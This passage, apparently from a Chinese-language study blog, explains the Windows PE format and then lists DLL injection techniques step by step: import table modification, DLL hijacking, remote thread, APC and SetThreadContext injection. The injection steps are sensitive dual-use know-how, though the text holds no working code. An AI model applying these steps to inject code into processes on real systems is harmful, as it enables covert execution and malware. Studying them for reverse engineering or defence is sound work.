title="MS-DOS头"></a>MS-DOS头</h4><p>每个PE文件都以一个DOS程序开头，如果程序在DOS下执行就会被识别出来，并显示一个类似的错误提示“This program cannot be run in MS-DOS mode”。一般由汇编器/编译器自动生成。</p><p><code>IMAGE_DOS_HEADER</code>（共0x40=64B）以“MZ”标志开头-魔数，其中的<code>e_lfanew</code>字段（最后4B）是真正的PE文件头的RVA</p><h4 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h4><p><code>IMAGE_NT_HEADERS</code>其中包含许多重要字段，由<code>Signature</code>+<code>IMAGE_FILE_HEADER</code>+<code>IMAGE_OPTIONAL_HEADER32</code>构成</p><ul><li><code>Signature</code>：“PE\0\0”表明PE文件头的开始</li><li><code>IMAGE_FILE_HEADER</code>：也叫COFF file header，因为在COFF格式的obj文件开始处也是这个<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_file_header">IMAGE_FILE_HEADER (winnt.h)</a></li><li><code>IMAGE_OPTIONAL_HEADER</code>：可选结构，但一般都会有因为前面一个结构体不足以定义PE的文件属性<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32">IMAGE_OPTIONAL_HEADER32 (winnt.h)</a></li></ul><h4 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h4><p>在PE文件头和原始数据之间有一个区块表，是一个<code>IMAGE_SECTION_HEADER</code>结构数组<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_section_header">IMAGE_SECTION_HEADER (winnt.h)</a>，每一项结构都包含了相应区块的信息，例如位置、长度、属性等，其长度=前面FILE_HEADER下的<code>NumberOfSections</code>指出</p><p>PE文件至少两个区块=代码块+数据块。</p><div class="table-container"><table><thead><tr><th>区块名称</th><th>说明</th></tr></thead><tbody><tr><td>.text</td><td>代码区块。或者叫code，内容全是指令代码</td></tr><tr><td>.data</td><td>默认读/写数据区块。全局+静态</td></tr><tr><td>.rdata</td><td>默认只读数据区。少见，存放说明字符串或存放调试目录</td></tr><tr><td>.idata</td><td>输入表。包含其他DLL的函数及数据信息，常合并到.rdata中</td></tr><tr><td>.edata</td><td>输出表。创建输出API或数据的可执行文件时，会有一个.EXP文件，其中包含此，但常被合并到.text或.tdata</td></tr><tr><td>.rsrc</td><td>资源。只读，不能是其他名字，包含图标/菜单/位图等</td></tr><tr><td>.bss</td><td>未初始化数据。少用，常.data区</td></tr><tr><td>.crt</td><td>用于支持Cpp运行时（CRT）所添加的数据</td></tr><tr><td>.tls</td><td>线程局部存储器，支持通过<code>__declspec(thread)</code>声明的线程局部存储变量的数据</td></tr><tr><td>.reloc</td><td>可执行文件的基址重定位。一般只有DLL有</td></tr><tr><td>.sdata</td><td>用于IA-64体系结构下（该体系纯血64位，不兼容32位）</td></tr><tr><td>.srdata</td><td>同上</td></tr><tr><td>.pdata</td><td>异常表。用于异常处理</td></tr><tr><td>.debug$S</td><td>OBJ文件中CodeView格式的<strong>符号</strong>记录流。</td></tr><tr><td>.debug$T</td><td>CodeView格式的<strong>类型</strong>记录流</td></tr><tr><td>.debug$P</td><td>与预编译有关</td></tr><tr><td>.drectve</td><td>链接器命令，只存在于OBJ文件。命令是给链接器的，空格隔开</td></tr><tr><td>.didat</td><td>延迟载入的输入数据。debug模式下才有，release模式下会合并到另一区块</td></tr></tbody></table></div><ul><li><p>VC编译器<code>#pragma data_seg(&quot;hh&quot;)</code>可自定义hh数据区块。</p></li><li><p>链接器会将不同文件中的区块进行<strong>部分</strong>合并（例如所有的text），有些模块是给链接器看的因此不会合并。</p></li><li>合并区块能够节省空间，因为一个区块至少占用1个内存页。</li><li>在PE文件头中有指出区块的大小是要对齐的，一种用于磁盘文件<code>FileAlignment</code>，一种用于内存中<code>SectionAlignment</code>。每个区块都从对齐值倍数处开始，中间填0（在磁盘中叫区块间隔）。一般默认都是4KB</li><li>磁盘对齐值和内存对齐值不同时，则磁盘映像和内存映像就不同（DOS头、PE头、块表不动）。<code>FileOffset = RVA - Δ</code> ；<code>VA - ImageBase - Δ = FileOffset</code>，画个图茅塞顿开</li></ul><blockquote><p>注意区分区块表和数据目录表，区块表顾名思义指向的是区块，而数据目录表则是指向一些重要的数据结构（目前msdn仅有15个表项），这些数据结构可能会存在于区块之下。后面的内容都是由数据目录表指向的</p></blockquote><h4 id="输入表"><a href="#输入表" class="headerlink" title="输入表"></a>输入表</h4><p>windows加载器通过PE文件的输入表（IT，也叫导入表）使得本程序可以使用其他文件中（如DLL）的函数数据（<code>__declspec(dllimport)</code>）。其中保存的是函数名和其驻留的DLL等动态链接所需的信息</p><ul><li><p>隐式链接：程序调用DLL的代码数据时，隐式被windows加载器完成（即下面的两个函数由加载器完成，而非自己编写的程序）</p><blockquote><p>windows加载器会一次性将所有需要的dll都给加载到内存中</p></blockquote></li><li><p>显式链接：在运行期链接，即DLL已经在内存中，<code>LoadLibrary()</code>和<code>GetProcAddress()</code></p></li></ul><p>输入表以一个<code>IMAGE_IMPORT_DESCRIPTOR</code>（IID）数组开始，一个外部DLL对应一个该结构。数组以NULL结尾，据此可得出项数（引入的dll数目）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;</span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125; DUMMYUNIONNAME;<span class="comment">//指向INT表的RVA</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件建立时间戳</span></span><br><span class="line">    DWORD   ForwarderChain;<span class="comment">//引用的DLL的API，又引用了其他DLL的API，现在一般为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">//指向的DLL名字</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">//一个指向IAT表的RVA</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="comment">//IAT-输入地址表&amp;INT-输入名称表，都是一个IMAGE_THUNK_DATA结构数组，且以0为结尾</span></span><br></pre></td></tr></table></figure><p>下面是<code>IMAGE_THUNK_DATA</code>结构体的说明，一个该结构体对应一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">//指向一个字符串的RVA</span></span><br><span class="line">        DWORD Function;             <span class="comment">//输入函数地址</span></span><br><span class="line">        DWORD Ordinal;<span class="comment">//输入API的序数值</span></span><br><span class="line">        DWORD AddressOfData;        <span class="comment">//指向IMAGE_IMPORT_BY_NAME表</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="comment">//双字最高位是1时，函数是以序号形式导入的，此时的低31/63位就是函数序号</span></span><br><span class="line"><span class="comment">//最高位是0时，函数以字符串形式导入，此时双字=RVA地址，指向一个IMAGE_IMPORT_BY_NAME</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//表示函数的序号</span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];<span class="comment">//导入函数的名称字符串</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME</span><br></pre></td></tr></table></figure><p>上述几个数据结构关系如下。PE装载器先搜索“OriginalFirstThunk”，据此<code>IMAGE_IMPORT_BY_NAME</code>来对比函数名，找出对应函数地址，并最终填入IAT</p><p><img src="https://s2.loli.net/2024/08/08/4jcUIxu5DarsOwC.png" alt="PE_IAT.png"></p><blockquote><p>有时一些函数仅通过序号引出，只能根据其相对位置来调用。</p><p>另一种情况是OriginalFirstThunk=0，初始化时系统根据FirstThunk——》IAT——》函数名——》得到函数入口地址——》替换IAT中的“指向字符串”的指针</p></blockquote><h4 id="绑定输入"><a href="#绑定输入" class="headerlink" title="绑定输入"></a>绑定输入</h4><p>在上一步我们需要在每次装载时，将需要用到的dll都给映射到内存，并替换函数地址。可以通过<strong>绑定输入</strong>将dll的地址提前写入程序IAT中（绑定程序在编译期间写入，而非加载运行时慢慢找）</p><ul><li>进程初始化时，需要的dll实际上加载到了他们首选的基地址中</li><li>绑定后，dll的输出表中的符号位置没有改变</li></ul><p>有一个不满足，就说明绑定的地址无效。当绑定时，会有dll的相关信息放入文件，加载器会对这些信息进行检查，来判断是否有效。数据目录表（可选头的最后一项）的第12项即T[11]<code>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</code>指向绑定输入，是<code>IMAGE_BOUND_IMPORT_DESCRIPTOR</code>结构数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_BOUND_IMPORT_DESCRIPTOR</span>&#123;</span></span><br><span class="line">DWORDTimeDateStamp;<span class="comment">//时间戳</span></span><br><span class="line">    WORDOffsetModuleName;<span class="comment">//一个指向被输入dll的名称的偏移</span></span><br><span class="line">    WORDNumberOfModuleForwardRefs;<span class="comment">//本结构后面紧跟的IMAGE_BOUND_FORWARDER_REF的数目(该结构前两项都和此结构相同,最后一项保留)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当一个DLL中的API需要用到别的DLL时，后面这个dll也需要检查，也就有了IMAGE_BOUND_FORWARDER_REF</p></blockquote><p>当dll版本信息与PE文件中不同时，就会认为绑定的信息无效，需要重定位（再次遍历找地址填入IAT）</p><h4 id="输出表"><a href="#输出表" class="headerlink" title="输出表"></a>输出表</h4><p>有输入就有输出，常见于dll。输出表位置由数据目录表（可选头最后一项）中的第一项指出，其中包含有函数名称、输出序数等，序数在一个dll中独一无二，长16位（但很少以此导出，容易出问题）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">//属性，一般为0</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件生成时间戳</span></span><br><span class="line">    WORD    MajorVersion;<span class="comment">//主版本号，常0</span></span><br><span class="line">    WORD    MinorVersion;<span class="comment">//次版本号</span></span><br><span class="line">    DWORD   Name;<span class="comment">//指向DLL名字</span></span><br><span class="line">    DWORD   Base;<span class="comment">//导出函数的起始序列号，与下面的序号y相加得到对应函数的导出序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;<span class="comment">//EAT-输出地址表 元素个数</span></span><br><span class="line">    DWORD   NumberOfNames;<span class="comment">//ENT-输出函数名称表 元素个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">//指向EAT，每个成员占4B，表示相应函数的RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">//指向ENT，一个指针数组，每个元素地址指向函数名字字符串，借此数组与我们需要的函数名称进行对比，我们可以找到目标的序号x</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">//指向一个序号对应数组，由上面的序号x，查找得到需要的函数地址在EAT中的序号y</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY</span><br></pre></td></tr></table></figure><p>注：NumberOfNames &lt;= NumberOfFunctions（导出的都有），有些函数只通过序数输出</p><h4 id="基址重定位"><a href="#基址重定位" class="headerlink" title="基址重定位"></a>基址重定位</h4><p>PE文件在执行时会装载到默认的基地址，如果此位置有东西，此时PE文件就需要装载到另一个地址中，就需要重定位表来调整</p><p>PE文件将文件中所有可能修改的地址都放在一个数组中（基地址重定位表），只要有一个需要修正，那么每个定位都会被修正（装载器换映射地址）</p><p>exe文件使用自己的独立的虚拟空间地址，因而能够正常的载入；但对于dll来说，dll无法保证载入地址没有其他dll，因此dll中常包含重定位信息</p><p>在.reloc区块中，由许多<strong>重定位块</strong>串接构成，每个块中有共计4KB大小的重定位信息，每个块以下面结构开头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">//重定位数据开始的RVA地址</span></span><br><span class="line">    DWORD   SizeOfBlock;<span class="comment">//重定位块大小</span></span><br><span class="line">    WORD    TypeOffset[];<span class="comment">//重定位数组-RVA(每项16位，高四位=0100时，低12位地址才有效)</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><h4 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h4><p>windows程序的各种界面，包括加速键、位图、光标、对话框、图标、菜单等都是资源。</p><ul><li>资源目录结构：节点=<code>IMAGE_RESOURCE_DIRECTORY</code>+若干<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>构成。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_RESOURCE_DIRECTORY</span>&#123;</span></span><br><span class="line">DWORDCharacteristics;<span class="comment">//资源属性标志，常0</span></span><br><span class="line">DWORDTimeDateStamp;</span><br><span class="line">DWORDMajorVersion;</span><br><span class="line">DWORDMinorVersion;</span><br><span class="line">DWORDNumberOfNameEntries;<span class="comment">//使用名字的资源条目个数</span></span><br><span class="line">DWORDNumberOfEntries;<span class="comment">//使用ID数字的资源条目个数</span></span><br><span class="line">&#125;<span class="comment">//上面两个Number的和，就是该结构后面紧跟的XX_DIRECTORY_ENTRY结构的数目</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span>&#123;</span></span><br><span class="line">DWORDName;<span class="comment">//目录项的名称字符串指针或ID</span></span><br><span class="line">    <span class="comment">//最高位=1，低位——》指针;否则当ID使用</span></span><br><span class="line">DWORDOffsetToData;<span class="comment">//资源数据偏移地址或子目录偏移</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将上面的<strong>节点</strong>分为三层，简称为结构A、B。</p><ul><li><p>第一层=1×A+k×B，每个B中的Name字段表示资源类型</p><blockquote><p>01h=光标；02h=位图；03h=图标。。。</p></blockquote></li><li><p>第二层=k×(A+B)，每个B中Name字段表示资源名称</p><blockquote><p>此时Name指向一个<code>IMAGERESOURCE_DIR_STRING_U</code>的字符串结构</p></blockquote></li><li><p>第三层=k×(A+B)，Name字段表示代码页编号</p><blockquote><p>该层的OffsetToData才指向下面的结构（资源数据）</p></blockquote></li></ul><p>每个资源必定由一个<code>IMAGE_RESOURCE_DATA_ENTRY</code>指向</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_RESOURCE_DATA_ENTRY</span>&#123;</span></span><br><span class="line">DWORDOffsetToData;<span class="comment">//资源数据RVA</span></span><br><span class="line">DWORDSize;<span class="comment">//资源大小</span></span><br><span class="line">DWORDCodePage;<span class="comment">//代码页，常0</span></span><br><span class="line">DWORDReserved;<span class="comment">//保留</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul><li><p>TLS初始化：TLS即线程本地存储器。<code>__declspec(thread)</code>声明变量TLS变量时，编译器将其放置到.tls区块，程序执行时，该区块会得到一块内存来存储TLS变量。数据目录表中相应位置有指针的话，会指向<code>IMAGE_TLS_DIRECTORY</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_TLS_DIRECTORY32</span>&#123;</span></span><br><span class="line">DWORDStartAddressOfRawData;<span class="comment">//内存起始地址，用于初始化新线程TLS</span></span><br><span class="line">DWORDEndAddressOfRawData;<span class="comment">//对应上面区域的结束地址</span></span><br><span class="line">DWORDAddressOfIndex;<span class="comment">//运行库利用该索引定位线程局部数据</span></span><br><span class="line">DWORDAddressOfCallBacks;<span class="comment">//回调函数指针数组的地址</span></span><br><span class="line">DWORDSizeOfZeroFill;<span class="comment">//后面跟的个数</span></span><br><span class="line">DWORDCharacteristics;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>调试目录：数据目录表中第七项指出调试目录，是一个<code>IMAGE_DEBUG_DIRECTORY</code>结构数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_DEBUG_DIRECTORY</span>&#123;</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">DWORDType;<span class="comment">//debug信息类型</span></span><br><span class="line">DWORDSizeOfData;<span class="comment">//debug数据大小</span></span><br><span class="line">DWORDAddressOfRawData;<span class="comment">//debug数据在内存的RVA，0表示不映射</span></span><br><span class="line">DWORDPointerToRawData;<span class="comment">//debug数据的FOA</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>多用pdb文件存储debug信息。</p></blockquote></li><li><p>延迟载入：即程序运行时通过<code>LoadLibrary()</code>、<code>GetProcAddress()</code>等获取延迟加载函数的地址。数据目录表中的相应位置指向<code>ImgDelayDescr</code>结构数组，一个延迟的dll对应这样一个结构。该结构中包含对应dll的IAT、INT指针，当程序需要调用其他API时，会先通过上面两个函数将得到的dll中IAT、INT地址填入本结构中，之后再调用时就在这里找。</p></li><li><p>程序异常数据：在x86基于表的异常处理方式下，数据目录表中会指向一个<code>IMAGE_RUNTIME_FUNCTION_ENTRY</code>结构数组，该数组记录每个函数的起始结束地址与异常处理方法等信息</p></li></ul><h3 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h3><p><code>VirtualQueryEx/VirtualProtectEx()</code>可以查询目标进程的内存信息和页属性，<code>ReadProcessMemory/WriteProcessMemory()</code>等可以对目标进程空间进行读写，但是跨进程不能执行自己的代码，于是dll注入目标就派上用场了</p><p>dll注入方法 == 程序加载dll的三个时机</p><ol><li>进程创建阶段加载输入表中的dll——静态输入</li><li>通过调用<code>LoadLibrary()</code>主动加载——动态加载</li><li>系统机制要求的一些系统预设的基础服务模块</li></ol><h4 id="干预输入表"><a href="#干预输入表" class="headerlink" title="干预输入表"></a>干预输入表</h4><p>进程创建后——》ntdll中的<code>LdrInitializeThunk()</code>调用——》<code>LdrpInitializeProcess()</code>对进程初始化——》<code>LdrpWalkImportDescriptor()</code>对输入表进行处理，填充相应IAT。因此需要在输入表被处理之前给输入表增加一个项目，使其指向需要加载的目标dll（或者替换dll）</p><p><strong>静态修改PE输入表</strong></p><ol><li><p>编写要注入的dll</p></li><li><p>寻找空间来增添新的IID，最好情况就是某节内部存在足够空隙，否则就需要扩展节/增加新节</p><blockquote><p>因为IID数组紧挨着OriginalFirstThunk和FirstThunk相关结构因此不能直接覆盖，故需要将其整体移动到新位置</p></blockquote></li><li><p>备份原IID数组（该位置不可写），将其复制到我们的目标空间（增加一项后，末尾记得补0）</p></li><li><p>在原IID数组位置上编写，新增项的关联OriginalFirstThunk、FirstThunk、Name有关结构</p></li><li><p>根据第4步新增结构，填写第3步的新增项</p></li><li><p>修正PE头中输入表目录位置和大小，主要注意新增的FirstThunk指向的位置（即IAT）要设置为可写。</p><blockquote><p>即原IID数组所在节整个添加可写属性，在区块表中原属性基础上加上<code>0xE0000020</code></p></blockquote></li><li><p>输入表如果有预先绑定就需要将PE文件头数据目录表中第11项清0</p></li></ol><blockquote><p>PEditor,LordPE等工具方便修改PE结构</p></blockquote><p><strong>进程创建期间修改PE输入表</strong></p><p>和上面的相比，因为是在进程创建期间修改，可利用的空间由“文件空隙”变成了“内存空隙”，因此会比较好找空间</p><ol><li><p>以挂起方式创建目标进程（借助另一个程序的<code>CreatProcess()</code>，加上<code>CREATE_SUSPENDED</code>标志）</p><blockquote><p><a href="https://github.com/microsoft/Detours">GitHub - microsoft/Detours</a></p></blockquote></li><li><p>获取目标进程中的PE结构，因为此时目标进程中许多数据结构没有初始化，需要自行搜索目标进程内存，对比属性为<code>MEM_IMAGE</code>的页映射是不是目标进程</p><blockquote><p>此时内存一般只有ntdll.dll和exe，前者一般都在靠后位置。或使用<code>ZwQueryInformationProcess()</code>API来查询PEB，其偏移0x8处就能得到exe的ImageBase了</p></blockquote></li><li><p>获取原IID大小，增加一项，直接从PE映射后的最后一个节的结束位置开始申请内存（加上标志<code>MEM_REVERSE</code>）存放新的IID</p></li><li><p>构造新IID项有关的OriginalFirstThunk、FirstThunk、Name有关结构</p></li><li><p>修正PE文件头，即输入表的虚拟偏移和大小</p><blockquote><p>修正之前用<code>VirtualProtectEx</code>将页属性修改位可写</p></blockquote></li><li><p>更新目标进程内存，继续运行主线程</p></li></ol><p><strong>输入表项dll替换法</strong></p><p>进程创建未完成之前，ntdll就已经加载了，任何R3下的劫持是无效的，其位于system32目录下。而kernel32.dll、msvcrtd.dll等则是进程创建完成、主线程初始化输入表时才载入的</p><p>加载DLL顺序</p><ol><li>注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code>中的对象目录中查找（kernel32.dll）</li><li>正在加载DLL的进程的exe目录（程序位置）</li><li>系统目录<code>\WINDOWS\SYSTEM32</code>、<code>\WINDOWS\SYSTEM</code>、<code>\WINDOWS</code>（系统目录）</li><li>正在加载DLL的进程当前目录（运行位置）</li><li>PATH环境变量</li><li>系统报错，找不到</li></ol><p>一般都是将自己的dll改名后放在程序位置下，有必要才到注册表中删除替换。需要注意在自己的dll中导出原dll需要用到的导出函数</p><blockquote><p>工具AheadLib输入待劫持dll，输出劫持源代码</p></blockquote><h4 id="改变程序运行流程使其加载至dll"><a href="#改变程序运行流程使其加载至dll" class="headerlink" title="改变程序运行流程使其加载至dll"></a>改变程序运行流程使其加载至dll</h4><p>通常是改变线程EIP、创建新线程或修改目标进程内的某些代码，使其执行<code>LoadLibrary()</code>来执行目标dll</p><p><strong>远程线程注入</strong></p><p>经典思路：</p><ol><li><code>OpenProcess()</code>打开目标进程</li><li>用<code>VirtualAllocEx()</code>在远程进程的内存地址空间分配区域存放dll文件名，并用<code>WriteProcessMemory()</code>写入</li><li>使用<code>GetProcAddress(GetModuleHandle())</code>结合获取kernel32.dll下的<code>LoadLibrary()</code>函数地址</li><li>使用<code>CreateRemoteThread()</code>传入<code>LoadLibrary()</code>函数地址与前面写的内存中dll文件路径指针</li></ol><blockquote><p>需要目标进程的4个权限，<code>PROCESS_CREATE_THREAD</code>、<code>PROCESS_QUERY_INFORMATION</code>、<code>PROCESS_VM_OPERATION</code>、<code>PROCESS_VM_WRITE</code></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread function (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></p></blockquote><p><strong>RtlCreateUserThread法</strong></p><p>原理同上，但是该函数一般用于创建特殊线程，不需要经过系统的验证登记，但是使用该函数需要自己结束自己</p><ol><li><p>打开目标进程，分配内存，写入shellcode</p><blockquote><p>shellcode中调用<code>ThreadProc</code>设置线程起始地址</p></blockquote></li><li><p>与前面3相同，获取ntdll.dll下的<code>RtlCreateUserThread()</code>地址</p></li><li><p>使用获取到的<code>RtlCreateUserThread</code>函数地址进行调用，传入shellcode地址及有关参数</p></li><li><p>线程创建失败<code>ResumeThread()</code>进行撤销</p></li></ol><p><strong>QueueUserApc/NtQueueAPCThread APC注入法</strong></p><p>APC即异步过程调用，是一种软件中断机制，当线程从等待状态苏醒时会检测是否有APC交付给自己，有的话就会执行这些APC过程（即函数）。</p><blockquote><p>线程调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx、WaitForSignalObjectEx函数时会进入到可唤醒状态</p></blockquote><p>APC包括两种：系统产生的内核模式APC、程序产生的用户模式APC。于是乎我们可以通过创建远程线程一样，使用<code>QueueUserAPC()</code>将我们的APC添加到目标线程的APC队列之中</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC 函数 (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></p></blockquote><p><strong>SetThreadContext法</strong></p><p>正在执行的线程被<code>SuspendThread()</code>暂停了——》线程环境上下文被保存——》<code>ResumeThread()</code>恢复线程执行——》线程从之前的eip开始执行。于是乎我们可以在目标进程暂停时，使eip指向我们的shellcode地址，在shellcode中先加载我们的dll，之后再跳回到原始的eip执行</p><ol><li><p>枚举目标进程中的线程，获取线程ID</p><blockquote><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first">Thread32First function (tlhelp32.h) - Win32 apps | Microsoft Learn</a></p></blockquote></li><li><p>打开进程和线程，暂停线程</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">SuspendThread 函数 (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></p></blockquote></li><li><p>获取线程的CONTEXT，然后保存eip</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">GetThreadContext 函数 (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></p></blockquote></li><li><p>申请内存，写入shellcode</p></li><li><p>设置新的CONTEXT并恢复线程的执行</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext 函数 (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></p></blockquote></li></ol><p><strong>内核中通过hook/Notify干预执行流程</strong></p><p>基本操作同上，也是通过写入shellcode并修改CONTEXT</p><p><strong>内核KeUserModeCallback法</strong></p><p>win在加载全局钩子dll时，由win32k.sys调用<code>KeUserModeCallback()</code>回调user32.dll中的函数并最终调用<code>LoadLibraryExW()</code>实现的</p><ul><li><p>回调<code>user32.dll!_ClientLoadLibrary</code>加载dll，需要依赖user32.dll</p></li><li><p>user32.dll在加载时会填充“PEB-&gt;KernelCallbackTable”为“User32! ApfnDispatch”这个回调表地址，<code>KeUserModeCallback()</code>回调后会执行<code>ntdll!KiUserCallbackDispatcher</code>命令，该命令根据提供的ApiIndex从上面回调表地址中取出相应回调函数地址调用</p><blockquote><p>调用<code>KeUserModeCallback</code>的线程必须是目标进程内自己的用户线程</p></blockquote></li></ul><p><strong>纯WriteMemory</strong></p><p>修改现有线程的执行流程，不使用<code>SetThreadContext</code>而是在线程要执行的地方预先挖坑，线程执行到此处会转而执行shellcode，执行完再把坑填了，之后线程继续</p><ul><li>创建进程时注入dll：使用<code>CreateProcess()</code>以“CREATE_SUSPEND”标志创建进程后，进程内还有许多数据没有初始化，有以下几个位置<ul><li><code>ntdll!KiUserApcDispatcher</code></li><li><code>ntdll!ZwTestAlert</code></li><li>进程入口点</li></ul></li><li>将DLL注入运行中的进程：注入位置变成了一些调用频率比较高的API</li></ul><h4 id="利用系统机制加载DLL"><a href="#利用系统机制加载DLL" class="headerlink" 